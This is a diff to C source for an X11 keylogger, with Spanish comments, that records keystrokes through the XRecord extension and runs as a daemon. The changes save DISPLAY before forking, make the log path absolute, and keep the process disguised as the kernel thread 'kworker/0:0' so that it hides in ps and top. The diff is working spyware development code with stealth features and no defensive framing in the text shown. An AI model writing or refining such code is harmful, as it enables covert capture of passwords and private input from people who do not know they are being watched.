@@ -45,6 +45,7 @@ typedef struct {
     int quiet_mode;
     char log_filename[256];
     char last_window[MAX_WINDOW_NAME];
+    char display_env[64];  // Guardar DISPLAY para uso después de daemonizar
 } KeyloggerState;
 
 // Estado global del keylogger
@@ -57,7 +58,8 @@ static KeyloggerState g_state = {
     .daemon_mode = 0,
     .quiet_mode = 0,
     .log_filename = LOG_FILE,
-    .last_window = {0}
+    .last_window = {0},
+    .display_env = {0}
 };
 
 // Manejador de señales para limpieza
@@ -241,6 +243,27 @@ void record_callback(XPointer closure, XRecordInterceptData *recorded_data) {
 }
 
 /**
+ * Convierte un path relativo a absoluto.
+ * Si ya es absoluto, lo copia sin cambios.
+ */
+void make_absolute_path(char *dest, const char *src, size_t dest_size) {
+    if (src[0] == '/') {
+        // Ya es absoluto
+        strncpy(dest, src, dest_size - 1);
+        dest[dest_size - 1] = '\0';
+    } else {
+        // Convertir a absoluto
+        char cwd[256];
+        if (getcwd(cwd, sizeof(cwd)) != NULL) {
+            snprintf(dest, dest_size, "%s/%s", cwd, src);
+        } else {
+            // Fallback: usar /tmp si no podemos obtener cwd
+            snprintf(dest, dest_size, "/tmp/%s", src);
+        }
+    }
+}
+
+/**
  * Daemoniza el proceso para ejecutarse en segundo plano.
  * - Hace fork() para desacoplar del terminal padre
  * - Crea nueva sesión con setsid()
@@ -252,17 +275,23 @@ void record_callback(XPointer closure, XRecordInterceptData *recorded_data) {
 int daemonize(void) {
     pid_t pid;
     
+    // Convertir log_filename a path absoluto ANTES de cambiar directorio
+    char abs_log[256];
+    make_absolute_path(abs_log, g_state.log_filename, sizeof(abs_log));
+    strncpy(g_state.log_filename, abs_log, sizeof(g_state.log_filename) - 1);
+    g_state.log_filename[sizeof(g_state.log_filename) - 1] = '\0';
+    
     // Primer fork: el padre termina, el hijo continúa
     pid = fork();
     if (pid < 0) {
         return -1;  // Error en fork
     }
     if (pid > 0) {
-        // Proceso padre: termina silenciosamente
-        printf("[*] Proceso daemon iniciado con PID: %d\n", pid);
-        printf("[*] El keylogger se ejecuta en segundo plano.\n");
+        // Proceso padre: mostrar info y terminar
+        printf("[*] Daemon iniciándose en segundo plano...\n");
         printf("[*] Log: %s\n", g_state.log_filename);
-        printf("[*] Para detener: kill %d\n", pid);
+        printf("[*] Para encontrar el PID: ps -eo pid,ppid,comm | grep kworker\n");
+        printf("[*] Para detener: pkill -f \"kworker/0:0\" (buscar PPID != 2)\n");
         exit(0);
     }
     
@@ -280,16 +309,16 @@ int daemonize(void) {
         exit(0);  // El primer hijo termina
     }
     
+    // Ahora somos el daemon real (nieto del proceso original)
+    
     // Cambiar el nombre del proceso para ocultarlo
     // Esto hace que aparezca como un proceso del sistema en `ps` y `top`
     if (prctl(PR_SET_NAME, DAEMON_PROCESS_NAME, 0, 0, 0) < 0) {
         // No es crítico si falla, continuamos
     }
     
-    // Cambiar directorio de trabajo a raíz (evita bloquear montajes)
-    if (chdir("/") < 0) {
-        // No es crítico
-    }
+    // NO cambiar directorio a raíz para evitar problemas con paths
+    // El log ya tiene path absoluto
     
     // Establecer máscara de permisos
     umask(0);
@@ -370,6 +399,17 @@ void print_usage(const char *prog_name) {
 int start_keylogger(void) {
     char timestamp[64];
     
+    // IMPORTANTE: Guardar DISPLAY antes de daemonizar
+    // Después de fork()/setsid(), el proceso pierde acceso a las variables de entorno
+    const char *display_env = getenv("DISPLAY");
+    if (display_env) {
+        strncpy(g_state.display_env, display_env, sizeof(g_state.display_env) - 1);
+        g_state.display_env[sizeof(g_state.display_env) - 1] = '\0';
+    } else {
+        // Valor por defecto si no está definido
+        strncpy(g_state.display_env, ":0", sizeof(g_state.display_env) - 1);
+    }
+    
     // Si es modo daemon, daemonizar primero
     if (g_state.daemon_mode) {
         if (daemonize() < 0) {
@@ -387,14 +427,19 @@ int start_keylogger(void) {
         printf("[*] Presione Ctrl+C para detener.\n\n");
     }
     
-    // Abrir conexión principal con X11
-    g_state.display = XOpenDisplay(NULL);
+    // Abrir conexión principal con X11 usando el DISPLAY guardado
+    g_state.display = XOpenDisplay(g_state.display_env);
     if (g_state.display == NULL) {
-        if (!g_state.quiet_mode) {
-            fprintf(stderr, "[!] Error: No se puede conectar al servidor X11.\n");
-            fprintf(stderr, "[!] Asegúrese de estar en un entorno con X11 activo.\n");
+        // Intentar con NULL como fallback
+        g_state.display = XOpenDisplay(NULL);
+        if (g_state.display == NULL) {
+            if (!g_state.quiet_mode) {
+                fprintf(stderr, "[!] Error: No se puede conectar al servidor X11.\n");
+                fprintf(stderr, "[!] Asegúrese de estar en un entorno con X11 activo.\n");
+                fprintf(stderr, "[!] DISPLAY usado: %s\n", g_state.display_env);
+            }
+            return 1;
         }
-        return 1;
     }
     
     // Verificar si la extensión XRecord está disponible
@@ -411,7 +456,11 @@ int start_keylogger(void) {
     }
     
     // Abrir segunda conexión para la grabación (requerido por XRecord)
-    g_state.record_display = XOpenDisplay(NULL);
+    g_state.record_display = XOpenDisplay(g_state.display_env);
+    if (g_state.record_display == NULL) {
+        // Intentar con NULL como fallback
+        g_state.record_display = XOpenDisplay(NULL);
+    }
     if (g_state.record_display == NULL) {
         if (!g_state.quiet_mode) {
             fprintf(stderr, "[!] Error: No se puede abrir segunda conexión X11.\n");
